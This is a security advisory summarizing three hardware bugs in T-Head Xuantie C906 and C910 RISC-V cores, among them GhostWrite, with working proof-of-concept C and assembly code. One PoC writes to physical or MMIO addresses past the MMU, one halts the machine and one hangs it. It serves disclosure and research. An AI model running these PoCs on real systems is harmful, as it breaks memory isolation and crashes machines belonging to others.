# Summary of Bugs in Xuantie C900-series core designs

### XTheadVector unit-strided stores with reserved width may bypass the MMU

Also known as [GhostWrite](https://ghostwriteattack.com/).

In both XTheadVector and V extension 1.0, unit-strided vector stores are
encoded as,

```
  31  29   28  27 26  25  24   20 19  15 14   12 11  7 6       0
 |  nf  | mew | mop | vm | sumop |  rs1 | width | vs3 | opcode  |
 |      |     | 00  |    |       |      |       |     | 0100111 |
 |      |     |     |    |       |      |       |     |         |
```

`mew` and `width` are combined together for specifying the unit length, but
instructions with `mew = 1` (length >= 128 bits) are reserved for now.

> The mew bit (inst[28]) when set is expected to be used to encode expanded
> memory sizes of 128 bits
and above, but these encodings are currently
> reserved.
> (The RISC-V Instruction Set Manual Volume I 20240411, 31.7.3)

C906 and C910 incorrectly decode instructions with `mew = 1`, and execute them.
On C906 a Store/AMO access fault will be raised, on C910 the instruction just
bypasses the MMU, and writes the least byte of `vs3` to address `rs1`.

On C910, the instruction is able to write both MMIO and memory addresses. The
value of fields `nf` doesn't make any differences on the length of written
bytes.

#### Proof of Concept

This PoC code makes use of the bug to write a string directly to the serial,
bypassing the kernel and MMU.

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

static void
ghostwrite(uintptr_t addr, uint8_t val)
{
        asm volatile ("\n\tth.vsetvli zero, zero, e8, m1"
                      "\n\tth.vmv.v.x v0, %0"
                      "\n\tmv t0, %1"
                      "\n\t.long 0x12028027"
                      : : "r" (val), "r"(addr) : "v0", "t0", "memory");
}

static void
ghostprint(uintptr_t p, const char *s)
{
        while (*s) {
                usleep(200);
                ghostwrite(p, *s);
                s++;
        }
}

int
main(int argc, const char *argv[])
{
        if (argc != 2) {
                printf("Usage: %s <UART_BASE>\n", argv[0]);
                return 0;
        }

        uintptr_t serialBase = strtoul(argv[1], NULL, 0);

        ghostprint(serialBase, "CRACKED BY GHOSTWRITE\n\r");

        return 0;
}
```

Must be compiled with `-march=rv64gc_xtheadvector`, e.g.

```shell
gcc ghostwrite-serial.c -o ghostwrite-serial -march=rv64gc_xtheadvector
```

and run with the UART base address, for example,

```shell
./ghostwrite-serial 0xffe7014000
```

on TH1520 SoC. `CRACKED BY GHOSTWRITE` should appear on the serial.

#### Affected Variants

- C906: tested with PoC on Sophgo CV1800B SoC
- C910: tested with PoC on T-Head TH1520 SoC

### Load instructions that modify the base register in XTheadMemIdx may halt C906

Also known as C906 halt sequence.

XTheadMemIdx provides extra integer memory operations. Among them there're 14
instructions load from memory address specified by the base register as well as
adjust the base register's value,

- th.lbib
- th.lbia
- th.lwuib
- th.lbuib
- th.lwia
- th.ldia
- th.lwib
- th.lbuia
- th.lhuia
- th.lhia
- th.ldib
- th.lhib
- th.lwuia
- th.lhuib

the last two character represents the order between load operation and register
adjustment,

- `a`: after increment, adjusting the base register -> loading from memory
- `b`: before increment, loading from memory -> adjusting the base register

These instructions are useful for array and stack accesses. Encodings with the
destination same as the base are reserved, but these reserved encodings may
crash C906 when it's followed by a CSR read targetting the same register, and
another access against the register.

Note that arbitrary instructions could be inserted between these three
operations, as long as they have nothing to do with the used register. Even the
subsequent sequence is incomplete for triggerring a crash, C906 still doesn't
report any exceptions for the reserved encoding.

#### PoC

```asm
        .global main
	main:
        mv              t0,     sp

        # th.lbib       t0,     (t0),   0,      0
        .word 0x0802c28b
        frcsr           t0
        addi            t0,     zero,   0

        ret
```

Could be compiled with GCC directly. Running it on C906 cores trigger a machine
crash.

```shell
gcc c906-halt-sequence.S -o c906-halt-sequence
```

#### Affected Variants

- C906: tested with PoC on Sophgo CV1800B SoC
- C910: isn't vulnerable to the issue. But it doesn't raise any exceptions for
        the reserved instructions, either.

## C910 may hang when accessing physically-backed virtual address zero

Reading from or writing to virtual address zero may make C910 hang if the
address is mapped to a physical address.

The issue doesn't happen on each run of the PoC, but 1000 runs are enough to
reproduce it stablily.

Since mapping a page to virtual address zero usually requires higher permission
or adjustment to the system settings (`vm.mmap_min_addr` on Linux), this isn't
a severe security problem.

#### PoC

```C
#include <errno.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

int
main(void)
{
        uint32_t *p = mmap((void *)0x0, 4096, PROT_READ | PROT_WRITE,
                          MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
        if (p == MAP_FAILED) {
                printf("failed to mmap a page at vaddr 0x0: %s\n",
                       strerror(errno));
                return -1;
        }

        puts("Reading from 0x00000000");
        printf("Got 0x%x\n", *p);

        puts("Reading again from 0x00000000");
        printf("Got 0x%x\n", *p);

        munmap(p, 4096);
        return 0;
}
```

Could be simply compiled with CC.

```
cc c910-read-from-vaddr-zero.c -o c910-read-from-vaddr-zero
```

Note that root permission is required to mmap an address below the value of
sysctl option `vm.mmap_min_addr`. To reproduce the bug,

```shell
# for i in $(seq 1 1000); do ./c910-read-from-vadddr-zero; done
```

#### Affected Variants

- C910: tested on T-Head TH1520

## Reference

This documentation is summarized from
[RISCVuzz: Discovering Architectural CPU Vulnerabilities via Differential Hardware Fuzzing](https://ghostwriteattack.com/riscvuzz.pdf),
thanks for the authors' work!

[T-Head Exception Specification](https://github.com/XUANTIE-RV/thead-extension-spec)
describes various extensions and corresponding instructions' format and behavior.
